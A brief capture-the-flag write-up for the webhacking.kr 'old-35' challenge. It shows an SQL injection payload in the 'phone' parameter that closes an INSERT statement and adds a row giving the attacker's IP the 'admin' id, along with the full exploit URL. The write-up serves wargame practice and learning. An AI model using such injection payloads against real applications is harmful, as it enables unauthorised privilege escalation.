---
layout: default
title: old-35
---

# Webhacking old-35 Solution

another sql injection.
here this is the payload we insert: 
id=`1` phone=`1),(%27admin%27,%27{your-ip}%27,2`

which is equivalent to `1),('admin','{your-ip}', 2`.

I checked before and learn how the insert command is looks like, the format is like this: `INSERT Values(id, IP, phone)`

then, when he sees your IP address has admin id, it solves the challenge.

```
https://webhacking.kr/challenge/web-17/index.php?id=1&phone=1),(%27admin%27,%27185.177.125.211%27,2
```
